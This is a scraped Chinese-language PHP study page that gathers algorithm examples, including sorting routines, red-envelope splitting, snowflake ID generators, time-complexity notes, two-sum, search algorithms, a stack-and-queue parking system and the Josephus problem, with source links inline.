if (!is_array($Arr)) return false; foreach ($Arr as $value) &#123; if ($value &lt; 0) return false; &#125; //排序算法 switch ($method) &#123; case 'quick' : usort($Arr, "cmp"); //快速排序 break; case 'bubble' : $Arr = bubble_sort($Arr); //冒泡排序 break; default : break; &#125; //拼接 return implode('', $Arr);&#125;$Arr = [20,913,223,91,20,3];echo '数组为[', implode(',', $Arr), ']', PHP_EOL;echo '最大排列组合为：', array_form_max_str($Arr), PHP_EOL;https://www.fanhaobai.com/2017/04/array-form-max-string.html PHP生成随机红包算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148原文：比如要把 1 个红包分给 N 个人，实际上就是相当于要得到 N 个百分比数据 条件是这 N 个百分比之和 = 100/100。这 N 个百分比的平均值是 1/N。 并且这 N 个百分比数据符合一种正态分布（多数值比较靠近平均值）。解读：比如我有 1000 块钱，发 50 个红包，就先随机出 50 个数，然后算出这 50 个数的均值 avg，用 avg/(1/N)，就得到了一个基数 mixrand ，然后用随机出的那 50 个数分别去除以 mixrand ，得到每个数相对基数的百分比 randVal ，然后用 randVal 乘以 1000 块钱，就可以得到每个红包的具体金额了。https://www.fanhaobai.com/2017/02/reward.htmlclass Reward&#123; public $rewardMoney; #红包金额、单位元 public $rewardNum; #红包数量 #执行红包生成算法 public function splitReward($rewardMoney, $rewardNum, $max, $min) &#123; #传入红包金额和数量，因为小数在计算过程中会出现很大误差，所以我们直接把金额放大100倍，后面的计算全部用整数进行 $min = $min * 100; $max = $max * 100; #预留出一部分钱作为误差补偿，保证每个红包至少有一个最小值 $this-&gt;rewardMoney = $rewardMoney * 100 - $rewardNum * $min; $this-&gt;rewardNum = $rewardNum; #计算出发出红包的平均概率值、精确到小数4位。 $avgRand = 1 / $this-&gt;rewardNum; $randArr = array(); #定义生成的数据总合sum $sum = 0; $t_count = 0; while ($t_count &lt; $rewardNum) &#123; #随机产出四个区间的额度 $c = rand(1, 100); if ($c &lt; 15) &#123; $t = round(sqrt(mt_rand(1, 1500))); &#125; else if ($c &lt; 65) &#123; $t = round(sqrt(mt_rand(1500, 6500))); &#125; else if ($c &lt; 95) &#123; $t = round(sqrt(mt_rand(6500, 9500))); &#125; else &#123; $t = round(sqrt(mt_rand(9500, 10000))); &#125; ++$t_count; $sum += $t; $randArr[] = $t; &#125; #计算当前生成的随机数的平均值，保留4位小数 $randAll = round($sum / $rewardNum, 4); #为将生成的随机数的平均值变成我们要的1/N，计算一下每个随机数要除以的总基数mixrand。此处可以约等处理，产生的误差后边会找齐 #总基数 = 均值/平均概率 $mixrand = round($randAll / $avgRand, 4); #对每一个随机数进行处理，并乘以总金额数来得出这个红包的金额。 $rewardArr = array(); foreach ($randArr as $key =&gt; $randVal) &#123; #单个红包所占比例randVal $randVal = round($randVal / $mixrand, 4); #算出单个红包金额 $single = floor($this-&gt;rewardMoney * $randVal); #小于最小值直接给最小值 if ($single &lt; $min) &#123; $single += $min; &#125; #大于最大值直接给最大值 if ($single &gt; $max) &#123; $single = $max; &#125; #将红包放入结果数组 $rewardArr[] = $single; &#125; #对比红包总数的差异、将差值放在第一个红包上 $rewardAll = array_sum($rewardArr); #此处应使用真正的总金额rewardMoney，$rewardArr[0]可能小于0 $rewardArr[0] = $rewardMoney * 100 - ($rewardAll - $rewardArr[0]); #第一个红包小于0时,做修正 if ($rewardArr[0] &lt; 0) &#123; rsort($rewardArr); $this-&gt;add($rewardArr, $min); &#125; rsort($rewardArr); #随机生成的最大值大于指定最大值 if ($rewardArr[0] &gt; $max) &#123; #差额 $diff = 0; foreach ($rewardArr as $k =&gt; &amp;$v) &#123; if ($v &gt; $max) &#123; $diff += $v - $max; $v = $max; &#125; else &#123; break; &#125; &#125; $transfer = round($diff / ($this-&gt;rewardNum - $k + 1)); $this-&gt;diff($diff, $rewardArr, $max, $min, $transfer, $k); &#125; return $rewardArr; &#125; #处理所有超过最大值的红包 public function diff($diff, &amp;$rewardArr, $max, $min, $transfer, $k) &#123; #将多余的钱均摊给小于最大值的红包 for ($i = $k; $i &lt; $this-&gt;rewardNum; $i++) &#123; #造随机值 if ($transfer &gt; $min * 20) &#123; $aa = rand($min, $min * 20); if ($i % 2) &#123; $transfer += $aa; &#125; else &#123; $transfer -= $aa; &#125; &#125; if ($rewardArr[$i] + $transfer &gt; $max) continue; if ($diff - $transfer &lt; 0) &#123; $rewardArr[$i] += $diff; $diff = 0; break; &#125; $rewardArr[$i] += $transfer; $diff -= $transfer; &#125; if ($diff &gt; 0) &#123; $i++; $this-&gt;diff($diff, $rewardArr, $max, $min, $transfer, $k); &#125; &#125; #第一个红包小于0,从大红包上往下减 public function add(&amp;$rewardArr, $min) &#123; foreach ($rewardArr as &amp;$re) &#123; $dev = floor($re / $min); if ($dev &gt; 2) &#123; $transfer = $min * floor($dev / 2); $re -= $transfer; $rewardArr[$this-&gt;rewardNum - 1] += $transfer; &#125; elseif ($dev == 2) &#123; $re -= $min; $rewardArr[$this-&gt;rewardNum - 1] += $min; &#125; else &#123; break; &#125; &#125; if ($rewardArr[$this-&gt;rewardNum - 1] &gt; $min || $rewardArr[$this-&gt;rewardNum - 1] == $min) &#123; return; &#125; else &#123; $this-&gt;add($rewardArr, $min); &#125; &#125;&#125;//https://github.com/xxlufei/reward 复杂度12345678910111213141516171819202122232425262728293031323334353637sum = n*(n+1)/2; //时间复杂度O(1)for(int i = 0; i &lt; n; i++)&#123; printf("%d ",i);&#125; //时间复杂度O(n)for(int i = 0; i &lt; n; i++)&#123; for(int j = 0; j &lt; n; j++)&#123; printf("%d ",i); &#125;&#125; //时间复杂度O(n^2)for(int i = 0; i &lt; n; i++)&#123; for(int j = i; j &lt; n; j++)&#123; printf("%d ",i); &#125;&#125; //运行次数为(1+n)*n/2//时间复杂度O(n^2)int i = 0, n = 100;while(i &lt; n)&#123; i = i * 2;&#125;//设执行次数为x. 2^x = n 即x = log2n//时间复杂度O(log2n)常用排序算法的时间复杂度https://learnku.com/articles/25297算法 最差时间分析 平均时间复杂度 稳定度 空间复杂度冒泡排序 O(n2) O(n2) 稳定 O(1)快速排序 O(n2) O(n*log2n) 不稳定 O(log2n)~O(n)选择排序 O(n2) O(n2) 稳定 O(1)二叉树排序 O(n2) O(n*log2n) 不稳定 O(n)插入排序 O(n2) O(n2) 稳定 O(1)堆排序 O(n*log2n) O(n*log2n) 不稳定 O(1)希尔排序 O O 不稳定 O(1) 快速排序123456789101112131415161718192021public static function quick($arr)&#123; if(count($arr)&lt;=1)&#123; //如果数组根本就一个元素就直接返回 不用在排序咯https://learnku.com/articles/25865 return $arr; &#125; $k=$arr[0];//定义一个初始要排序的值 默认为数组第一个 $x=array();//定义比要排序的值 小的数组块 $y=array();//定义比要排序的值 大的数组块 $_size=count($arr);//统计数组的大小 for($i=1;$i&lt;$_size;$i++)&#123;//循环数组 记住这边要从索引1 开始 if($arr[$i]&lt;=$k)&#123;//如果当前的值小于 要排序的值 $x[]=$arr[$i];//就把小于的值放到 小的数组块中 &#125;elseif($arr[$i]&gt;$k)&#123;//如果当前的值大于 要排序的值 $y[]=$arr[$i];//就把大于的值放到 大的数组块中 &#125; &#125; $x=Sort::quick($x);//依次递归执行 这样就会得到小的数组块 $y=Sort::quick($y);//依次递归执行 这样就会得到大的数组块 return array_merge($x,array($k),$y);//最后在合并下 小的模块+中间的模块【初始要排序的值】+大的模块 就ok~ &#125; // print_r(Sort::quick($arr)); 雪花算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170最高位是符号位，始终为0，不可用接下来的41位为毫秒级时间(41位的长度可以使用69年)然后是5位datacenterId和5位workerId(10位的长度最多支持部署1024个节点）最后12位是毫秒内的计数（12位的计数顺序号支持每个节点每毫秒产生4096个ID序号）一共加起来刚好64位，为一个Long型。(转换成字符串后长度最多19)snowflake生成的ID整体上按照时间自增排序，并且整个分布式系统内不会产生ID碰撞（由datacenter和workerId作区分），并且效率较高。经测试snowflake每秒能够产生26万个ID。class SnowFlake&#123; public function createID()&#123; //假设一个机器idhttps://ctexthuang.com/archives/6/ $machineId = 1234567890; //41bit timestamp(毫秒) $time = floor(microtime(true) * 1000); //0bit 未使用 $suffix = 0; //datacenterId 添加数据的时间 $base = decbin(pow(2,40) - 1 + $time); //workerId 机器ID $machineid = decbin(pow(2,9) - 1 + $machineId); //毫秒类的计数 $random = mt_rand(1, pow(2,11)-1); $random = decbin(pow(2,11)-1 + $random); //拼装所有数据 $base64 = $suffix.$base.$machineid.$random; //将二进制转换int $base64 = bindec($base64); $id = sprintf('%.0f', $base64); return $id; &#125;&#125;namespace EasySwoole\Core\Utility;/** * 雪花算法生成器 * Class SnowFlake * @author : evalor &lt;master@evalor.cn&gt; * @package EasySwoole\Core\Utility */class SnowFlake&#123; private static $lastTimestamp = 0; private static $lastSequence = 0; private static $sequenceMask = 4095; private static $twepoch = 1508945092000; /** * 生成基于雪花算法的随机编号 * @author : evalor &lt;master@evalor.cn&gt; * @param int $dataCenterID 数据中心ID 0-31 * @param int $workerID 任务进程ID 0-31 * @return int 分布式ID */ static function make($dataCenterID = 0, $workerID = 0) &#123; // 41bit timestamp + 5bit dataCenter + 5bit worker + 12bit $timestamp = self::timeGen(); if (self::$lastTimestamp == $timestamp) &#123; self::$lastSequence = (self::$lastSequence + 1) &amp; self::$sequenceMask; if (self::$lastSequence == 0) $timestamp = self::tilNextMillis(self::$lastTimestamp); &#125; else &#123; self::$lastSequence = 0; &#125; self::$lastTimestamp = $timestamp; $snowFlakeId = (($timestamp - self::$twepoch) &lt;&lt; 22) | ($dataCenterID &lt;&lt; 17) | ($workerID &lt;&lt; 12) | self::$lastSequence; return $snowFlakeId; &#125; /** * 反向解析雪花算法生成的编号 * @author : evalor &lt;master@evalor.cn&gt; * @param int|float $snowFlakeId * @return \stdClass */ static function unmake($snowFlakeId) &#123; $Binary = str_pad(decbin($snowFlakeId), 64, '0', STR_PAD_LEFT); $Object = new \stdClass; $Object-&gt;timestamp = bindec(substr($Binary, 0, 41)) + self::$twepoch; $Object-&gt;dataCenterID = bindec(substr($Binary, 42, 5)); $Object-&gt;workerID = bindec(substr($Binary, 47, 5)); $Object-&gt;sequence = bindec(substr($Binary, -12)); return $Object; &#125; /** * 等待下一毫秒的时间戳 * @author : evalor &lt;master@evalor.cn&gt; * @param $lastTimestamp * @return float */ private static function tilNextMillis($lastTimestamp) &#123; $timestamp = self::timeGen(); while ($timestamp &lt;= $lastTimestamp) &#123; $timestamp = self::timeGen(); &#125; return $timestamp; &#125; /** * 获取毫秒级时间戳https://www.libenfu.com/index.php/archives/302/ * @author : evalor &lt;master@evalor.cn&gt; * @return float */ private static function timeGen() &#123; return (float)sprintf('%.0f', microtime(true) * 1000); &#125;&#125;1bit正负标识位 - 41bits毫秒级时间戳 - 5bits数据中心id - 5bits机器id -12bits毫秒内顺序idcomposer require wantp/snowflakehttps://github.com/wantp/snowflake /** * 分布式 id 生成类 组成: &lt;毫秒级时间戳+机器id+序列号&gt; * 默认情况下41bit的时间戳可以支持该算法使用到2082年，10bit的工作机器id可以支持1023台机器， *序列号支持1毫秒产生4095个自增序列id * @author zhangqi */ class IdCreate &#123; const EPOCH = 1479533469598; //开始时间,固定一个小于当前时间的毫秒数\ const max12bit = 4095; const max41bit = 1099511627775; static $machineId = null; // 机器id public static function machineId($mId = 0) &#123; self::$machineId = $mId; &#125; public static function createOnlyId() &#123; // 时间戳 42字节 $time = floor(microtime(true) * 1000); // 当前时间 与 开始时间 差值 $time -= self::EPOCH; // 二进制的 毫秒级时间戳 $base = decbin(self::max41bit + $time); // 机器id 10 字节 if (!self::$machineId) &#123; $machineid = self::$machineId; &#125; else &#123; $machineid = str_pad(decbin(self::$machineId), 10, "0", STR_PAD_LEFT);\ &#125; // 序列数 12字节 $random = str_pad(decbin(mt_rand(0, self::max12bit)), 12, "0", STR_PAD_LEFT);\ // 拼接 $base = $base . $machineid . $random; // 转化为 十进制 返回 return bindec($base); &#125; &#125; 调用 IdCreate::createOnlyId(1); 返回的值 // 2219944901359 返回的值 // 2220004015923 返回的值 // 2220062766757 返回的值 // 2220119764908 时间复杂度1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798//https://learnku.com/laravel/t/28462执行次数 T (n) 是关于问题规模 n 的函数常数阶复杂度为 O (1)线性阶int i;for(i = 0 ; i &lt; n ; i++)&#123; //代码&#125;复杂度为 O (n)对数阶int count = 1;while(count &lt; n)&#123; count = count * 2; //代码 &#125;数学公式：2x = n --&gt; x = log2n因此这个循环的时间复杂度为 O (logn)平方阶类型 1：n*nint i;for(i = 0 ; i &lt; n ; i++)&#123; for(j = 0 ; j &lt; n ; j++)&#123; //代码 &#125; &#125;时间复杂度为 O (n^2^)。类型 2：n*m如果内层循环改成了 m 次，时间复杂度就为 O (n*m)int i;for(i = 0 ; i &lt; n ; i++)&#123; for(j = 0 ; j &lt; m ; j++)&#123; /*时间复杂度为O(1)的程序*/ &#125; &#125;类型 3：特殊 n*n再来看一段程序，当内层循环 j = i 时int i;for(i = 0 ; i &lt; n ; i++)&#123; for(j = i ; j &lt; n ; j++)&#123; /*时间复杂度为O(1)的程序*/ &#125; &#125;i = 0 时，内层循环执行了 n 次，i = 1 时，执行了 n-1 次，i = n-1 时，执行了 1 次，所以总的执行次数为：n+(n-1)+(n-1)+...+1 = n(n+1)/2 = n^2^/2 + n/2根据大 O 推导方法，保留最高阶项，n^2^/2 ，然后去掉这个项相乘的常数，1/2因此，这段代码的时间复杂度为 O (n^2^)类型 4：斐波那契数列long aFunc(int n) &#123; if (n &lt;= 1) &#123; return 1; &#125; else &#123; return aFunc(n - 1) + aFunc(n - 2); &#125;&#125;显然运行次数，T (0) = T (1) = 1，同时 T (n) = T (n - 1) + T (n - 2) + 1，这里的 1 是其中的加法算一次执行。通过归纳证明法可以证明，当 n &gt;= 1 时 T (n) &lt; (5/3)^n^，同时当 n &gt; 4 时 T (n) &gt;= (3/2)^n。简化后为 O (2^n^)常见的时间复杂度执行次数函数 阶 术语描述12 O(1) 常数阶2n+3 O(n) 线性阶3n^2^+2n+1 O(n^2^) 平方阶5log2^n^+20 O(log2^n^) 对数阶2n+3nlog2^n^+19 O(nlogn) nlog2^n^ 阶6n^3^+2n^2^+3n+4 O(n3) 立方阶2n O(2n) 指数阶时间复杂度所耗费的时间是：O(1) &lt; O(logn) &lt; O(n) &lt; O(nlogn) &lt; O(n^2^) &lt; O(n^3^) &lt;O(2^n^) &lt; O(n!) &lt;O(n^n^) 排序123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100//测试调用public function aa()&#123; $ad = [12,5,644,64,6546,54,54,897,321,231,54,321,56]; $res = $this-&gt;InsertSort($ad); return $res;&#125;/** *@func 插入排序 * @describe 算法适用于少量数据的排序，时间复杂度为O(n^2)。是稳定的排序方法。 * 插入算法把要排序的数组分成两部分：第一部分包含了这个数组的所有元素， * 但将最后一个元素除外（让数组多一个空间才有插入的位置），而第二部分就只包含这一个元素（即待插入元素）。 * 在第一部分排序完成后，再将这个最后元素插入到已排好序的第一部分中。 * * @author vio **/private function InsertSort(array $arr=[])&#123; $count = count($arr); for($i=1;$i&lt;$count;$i++)&#123; $t = $arr[$i]; $j = $i-1; while ($j&gt;=0 &amp;&amp; $arr[$j]&gt;$t)&#123; $arr[$j+1] = $arr[$j]; $j--; &#125; if ($i!=$j+1)&#123; $arr[$j+1] = $t; &#125; &#125; return $arr;&#125;/** *@func 选择排序 * @O O(n^2) * @describe 遍历数组，将数组中最小的值换到第一个，然后再遍历数组，将第二小的值换到数组的第二个位置，以此类推 * @author vio **/private function SelectSort(array $arr=[])&#123; $count = count($arr); for($i=0;$i&lt;$count;$i++)&#123; $k = $i; for($j=$i+1;$j&lt;$count;$j++)&#123; if ($arr[$j]&lt;$arr[$k])&#123; $k = $j; &#125; &#125; if ($k!=$i)&#123; $t = $arr[$k]; $arr[$k] = $arr[$i]; $arr[$i] = $t; &#125; &#125; return $arr;&#125;/** *@func 冒泡排序 * @describe 将数组的每一个数与其后的每一个数比较，如果这个数大于他后面的数，则交换位置 * @author vio **/private function BubbleSort(array $arr=[])&#123; $count = count($arr); for($i=0;$i&lt;$count-1;$i++)&#123; for ($j=$i;$j&lt;$count;$j++)&#123; if($arr[$i]&gt;$arr[$j])&#123; $t = $arr[$i]; $arr[$i] = $arr[$j]; $arr[$j] = $t; &#125; &#125; &#125; return $arr;&#125;/** *@func 快速排序 * @O O(nlogn) 最糟 O(n^2) * @describe 从数组中选一个基准点，遍历数组，大于基准点的放到一个数组，其余放到另一个数组。 * 递归的对子数组排序 * @author vio**/private function QuickSort(array $arr=[])&#123; $count = count($arr); if ($count&lt;=1)&#123; return $arr; &#125; $pivot = $arr[0]; $left = $right = []; for($i=1;$i&lt;$count;$i++)&#123; if($arr[$i]&lt;$pivot)&#123; array_push($left,$arr[$i]); &#125;else&#123; array_push($right,$arr[$i]); &#125; &#125; $left = $this-&gt;QuickSort($left); $right = $this-&gt;QuickSort($right); return array_merge($left,[$pivot],$right);&#125; 两数之和12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152给定 $nums = [2, 7, 11, 15], $target = 9因为 nums[0] + nums[1] = 2 + 7 = 9所以返回 [0, 1]function twoSum($nums, $target) &#123; foreach($nums as $k=&gt;$v)&#123; $an = $target - $nums[$k]; unset($nums[$k]); $res = array_search($an,$nums); if($res !== false)&#123; return [$k,$res]; &#125; &#125;&#125;$arr = twoSum($nums,$target);print_r($arr); function twoSum($nums, $target) &#123; $res = []; foreach($nums as $k =&gt; $v) &#123; $diff = $target - $v; if(in_array($diff, $nums)) &#123; $diff_key = array_search($diff, $nums); if($diff_key !== $k) &#123; $res = [$k, $diff_key]; break; &#125; &#125; &#125; return $res; &#125; function twosum（$nums，$target）&#123; $count=count（$nums）； for（$K=0；k&lt;$count；$k++）&#123; for（$i=0；$i&lt;$count；$i++）&#123; if（$k&lt;$i&amp;&amp;$nums[$i]+$nums[$k]==$target）&#123; return[$k，$i]； &#125;&#125; return[]； function twosum（$nums，$target）&#123; $numsMatches=[]； foreach（$nums as $k=&gt;$v）&#123; $numsMatches[$target-$v]=$k; &#125; foreach（$nums as k=&gt;$v）&#123; if（isset（$numsMatches[$v]）&amp;&amp; $K!=$numsMatches[$v]）&#123; return[$k，$numsMatches[$v]]； &#125; return[]； https://learnku.com/articles/31920 https://learnku.com/php/tweets/31775 索引顺序查找1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465class Index&#123; public $key;//索引块表中的最大值 public $start;//索引块表中的起始地址&#125;function cmp(Index $a,Index $b)&#123; if ($a-&gt;key==$b-&gt;start)&#123; return 0; &#125; return $a-&gt;key&gt;$b-&gt;key?1:-1;&#125;/**从索引表中检索，再从数据集合里检索数据**/function search($key,$data=[],$index=[]):int&#123; $i=0; while($i&lt;3&amp;&amp;$key&gt;$index[$i]-&gt;key)&#123;//索引表中检索获取某块 $i++; &#125; if ($i&gt;=3)&#123; return -1; &#125; $startValue = $index[$i]-&gt;start;//获取某块起始地址 while($startValue&lt;=$startValue+5&amp;&amp;$data[$startValue]!=$key)&#123;//从查找表指定范围检索 $startValue++; &#125; if ($startValue&gt;$startValue+5)&#123; return -1; &#125; return $startValue;&#125;(function()&#123; //查找表【数据集合】 $data = [54,53,52,51,50,55, 44,46,48,49,43,41, 84,83,65,74,98,100]; //索引块表 $index = []; $j=-1; $indexObj = new Index(); for($i=0;$i&lt;3;$i++)&#123;//数据分块处理 $obj = clone $indexObj; $obj-&gt;start=$j+1; $j+=6; $index[$i] = $obj; for ($k=$index[$i]-&gt;start;$k&lt;=$j;$k++) &#123; if ($index[$i]-&gt;key&lt;$data[$k])&#123; $index[$i]-&gt;key = $data[$k]; &#125; &#125; &#125; usort($index,'cmp'); $key = fgets(STDIN,10); $location = search(intval($key),$data,$index); if ($location&gt;=0)&#123; fwrite(STDOUT,"ok find elem ".$location); &#125;else&#123; fwrite(STDERR,"not found!"); &#125;&#125;)();https://learnku.com/articles/31876 数据结构栈和队列排队算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180栈也是一种特殊的线性表结构，数据只能在某一端进行操作，能操作数据的那一端为栈顶，对应的为栈底，数据入栈的过程就是入栈【压栈，进栈】，数据出栈的过程就是【弹栈，出栈】，遵循先进后出原则 FIRST IN LAST OUT 即 FILO 结构，基于连续的内存单元则是顺序栈表，一种是使用分散的内存单元存储为链式结构即链栈结构。/** * 队列+栈数据结构的停车排队管理系统 */define("MAXSIZE",3);$station = [];//停车场栈$parkTop = 0;$road = [];//便道队列$roadFront = $roadNear = 0;//队列游标class Car&#123; public $carNumber; public $arriveTime;&#125;/** * 压栈 * @param $station * @param $parkTop * @param Car $car * @return int */function push(&amp;$station,&amp;$parkTop,Car $car)&#123; if ($parkTop&gt;=MAXSIZE)&#123; echo "停车场没有位置了哦".PHP_EOL; return -1; &#125; $station[$parkTop] = $car; echo "车牌号为:".$car-&gt;carNumber."的车主停车位为：".($parkTop+1).PHP_EOL; $parkTop++; return 1;&#125;/** * 出栈 * @param $station * @param $parkTop * @param $carNumber * @return Car */function pop(&amp;$station,&amp;$parkTop,$carNumber)&#123; $location = -1; $tempStation = [];//临时栈 $tempLocation = 0; $car = new Car(); $car-&gt;carNumber = -1; $car-&gt;arriveTime = -1; for($i=0;$i&lt;$parkTop;$i++)&#123; if ($station[$i]-&gt;carNumber==$carNumber)&#123; $location=$i; break; &#125; &#125; if ($location==-1)&#123; echo "停车场没有这车"; &#125;else&#123; while($parkTop&gt;$location+1)&#123; $parkTop--; $tempStation[$tempLocation] = $station[$parkTop]; $tempLocation++; &#125; $parkTop--; $car = $station[$parkTop]; while($tempLocation&gt;0)&#123; $tempLocation--; $station[$parkTop] = $tempStation[$tempLocation]; $parkTop++; &#125; &#125; return $car;&#125;echo "欢迎使用停车位管理系统".PHP_EOL;echo date("Y年-m月-d日 H时:i分:s秒").PHP_EOL;while(1)&#123; echo "停车(A;离开(D;是否有空位(E;停车场车辆列表(L;退出#".PHP_EOL; $cmd = fread(STDIN,1); if ($cmd=='#')&#123; echo "欢迎下次再来".PHP_EOL; break; &#125; switch (trim($cmd))&#123; case 'L': if ($parkTop&gt;0)&#123; echo "|---车牌号---|---停车时间---|---车 位---|---区域---|".PHP_EOL; for($j=$parkTop-1;$j&gt;=0;$j--)&#123; echo "|---".$station[$j]-&gt;carNumber."---|---".$station[$j]-&gt;arriveTime.":00:00---|---".($j+1).' 号---|---车场---|'.PHP_EOL; &#125; &#125; if ($roadFront!=$roadNear)&#123; for($j=$roadFront;$j&lt;$roadNear;$j++)&#123; echo "|---".$road[$j]-&gt;carNumber."---|---".$road[$j]-&gt;arriveTime.":00:00---|---".($j+1).' 号---|---便道---|'.PHP_EOL; &#125; &#125; break; case "A": echo "请输入车牌号和到达时间".PHP_EOL; $input = trim(fread(STDIN,10)); fflush(STDIN); if (strpos($input,":")&lt;-1)&#123; echo "输入错误".PHP_EOL; break; &#125; $input = explode(":",$input); if (count($input)&lt;2)&#123; echo "车牌号和时间输入错误".PHP_EOL; break; &#125; $carNumber = $input[0]; $arriveTime= (integer)$input[1]; if (empty($arriveTime))&#123; echo "时间输入错误".PHP_EOL; break; &#125; $car = new Car(); $car-&gt;carNumber = $carNumber; $car-&gt;arriveTime = $arriveTime; $result = push($station,$parkTop,$car); if ($result==-1)&#123; $road[$roadNear] = $car; $roadNear++; echo "车牌为号：".$car-&gt;carNumber."的车停在了便道上的:".$roadNear."，位置上了".PHP_EOL; &#125; break; case "E": if ($parkTop&gt;=MAXSIZE)&#123; echo "目前没有空位了，进来只能停在便道上了".PHP_EOL; &#125;else&#123; echo "有空位，停车费一个小时20美金".PHP_EOL; &#125; break; case "D": echo "请输入要离开的车牌号和离开时间".PHP_EOL; $input = trim(fread(STDIN,10)); fflush(STDIN); if (strpos($input,":")&lt;-1)&#123; echo "输入错误".PHP_EOL; break; &#125; $input = explode(":",$input); if (count($input)&lt;2)&#123; echo "输入错误".PHP_EOL; break; &#125; $carNumber = $input[0]; $arriveTime = $input[1]; if (empty($arriveTime))&#123; echo "输入错误".PHP_EOL; break; &#125; /** @var Car $car */ $car = pop($station,$parkTop,$carNumber); if ($car-&gt;carNumber==-1)&#123; echo "停车场没有你要找的车".PHP_EOL; &#125;else&#123; $time = $arriveTime-$car-&gt;arriveTime; echo "车牌号为:".$car-&gt;carNumber."的停车时间为：".$time."H,需要缴纳:".($time*20)."美金停车费用".PHP_EOL; echo "车牌号为:".$car-&gt;carNumber."的车已经出来，停在便道上的车将进场".PHP_EOL; if ($roadFront!=$roadNear)&#123; $car = $road[$roadFront]; echo "车牌号为：".$car-&gt;carNumber."的车请输入到达时间".PHP_EOL; $arriveTime = trim(fread(STDIN,5)); $car-&gt;arriveTime = $arriveTime; $station[$parkTop] = $car; $parkTop++; $roadFront++; echo "停在便道上的车牌为：".$car-&gt;carNumber."已经进入停车场了".PHP_EOL; &#125; &#125; break; default: break; &#125;&#125;https://learnku.com/articles/30492 队列数据结构12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758define('MAXSIZE',5);//队列空间大小/** * @param $queue 队列存储空间 * @param $front 队列队头游标 * @param $near 队列队尾游标 * @param $data 进队的数据 * @return int */function enQueue(&amp;$queue,$front,$near,$data)&#123; if (($near+1)%MAXSIZE==$front)&#123; throw new RuntimeException("队空间已满"); &#125; $queue[$near%MAXSIZE] = $data; $near+=1; return $near;&#125;/** * 出队操作 * @param $queue * @param $front * @param $near * @return int */function deQueue(&amp;$queue,$front,$near)&#123; if ($front==$near%MAXSIZE)&#123; throw new RuntimeException("空队列"); &#125; $data = $queue[$front]; echo "出队元素：".$data.PHP_EOL; $front = ($front+1)%MAXSIZE; return $front;&#125;$a = [];//队列 使用数组模拟$front = $near = 0;//游标初始化$near = enQueue($a,$front,$near,1);$near = enQueue($a,$front,$near,2);$near = enQueue($a,$front,$near,3);$front = deQueue($a,$front,$near);$front = deQueue($a,$front,$near);$front = deQueue($a,$front,$near);//$front = deQueue($a,$front,$near);$near = enQueue($a,$front,$near,100);$front = deQueue($a,$front,$near);$near = enQueue($a,$front,$near,1);$near = enQueue($a,$front,$near,2);$near = enQueue($a,$front,$near,3);$near = enQueue($a,$front,$near,4);$front = deQueue($a,$front,$near);$front = deQueue($a,$front,$near);$front = deQueue($a,$front,$near);$front = deQueue($a,$front,$near);https://learnku.com/articles/30430 二分查找123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051class Elem&#123; public $key;&#125;class Table&#123; public $data = []; public $lenght;&#125;function createTable(Table &amp;$table,$length)&#123; $table-&gt;lenght = $length; $obj = new Elem(); fwrite(STDOUT,"请输入数据：\n"); for($i=1;$i&lt;=$table-&gt;lenght;$i++)&#123; $elem = clone $obj; $elem-&gt;key = fgets(STDIN,10); $table-&gt;data[$i] = $elem; &#125;&#125;function searchBin(Table $table,$key):int&#123; $low = 1; $height = $table-&gt;lenght; while($low&lt;=$height)&#123; $mid = floor(($low+intval($height))/2); if ($table-&gt;data[$mid]-&gt;key==$key)&#123; return $mid; &#125;else if($table-&gt;data[$mid]-&gt;key&gt;$key)&#123; $height=$mid-1; &#125;else&#123; $low = $mid+1; &#125; &#125; return 0;&#125;(function()&#123; $table = new Table(); fwrite(STDOUT,"请输入数据元素个数：\n"); $length = fgets(STDIN,10); createTable($table,$length); fwrite(STDOUT,"请输入要查找的数据元素：\n"); $key = (integer)fgets(STDIN,10); $location = searchBin($table,$key); if ($location)&#123; fwrite(STDOUT,"查找到的数据索引为：$location\n"); &#125;else&#123; fwrite(STDERR,"查找不到指定的内容\n"); &#125;&#125;)();https://learnku.com/articles/31829 约瑟夫环12345678910111213141516171819202122232425262728293031323334353637383940414243一群猴子排成一圈，按 1，2，…，n 依次编号。然后从第 1 只开始数，数到第 m 只，把它踢出圈，从它后面再开始数，再数到第 m 只，在把它踢出去…，如此不停的进行下去，直到最后只剩下一只猴子为止，那只猴子就叫做大王。要求编程模拟此过程，输入 m、n, 输出最后那个大王的编号。 function king($n, $m)&#123; //创建1到n数组 $monkeys = range(1, $n); $i=0; //循环条件为猴子数量大于1 while (count($monkeys)&gt;1) &#123; //$i为数组下标;$i+1为猴子标号 if(($i+1)%$m==0) &#123; //余数等于0表示正好第m个，删除，用unset删除保持下标关系 unset($monkeys[$i]); &#125; else &#123; //如果余数不等于0，则把数组下标为$i的放最后，形成一个圆形结构 array_push($monkeys,$monkeys[$i]); unset($monkeys[$i]); &#125; //$i 循环+1，不断把猴子删除，或 push到数组 $i++; &#125; //猴子数量等于1时输出猴子标号，得出猴王 return current($monkeys); &#125; echo king(6,3);range(m,n) 创建一个包含从 "m" 到 "n" 之间的元素范围的数组range(1, 5);// [0=&gt;1, 1=&gt;2, 2=&gt;3, 3=&gt;4, 4=&gt;5];unset(...$str) 销毁给定的变量$array=[1,2,3,4,5];unset($array[2]);// [0=&gt;1, 1=&gt;2, 3=&gt;4, 4=&gt;5];array_push($array, ...$str) 向数组尾部插入变量$array=[1, 2];array_push($array, 3, 4);// [1, 2, 3, 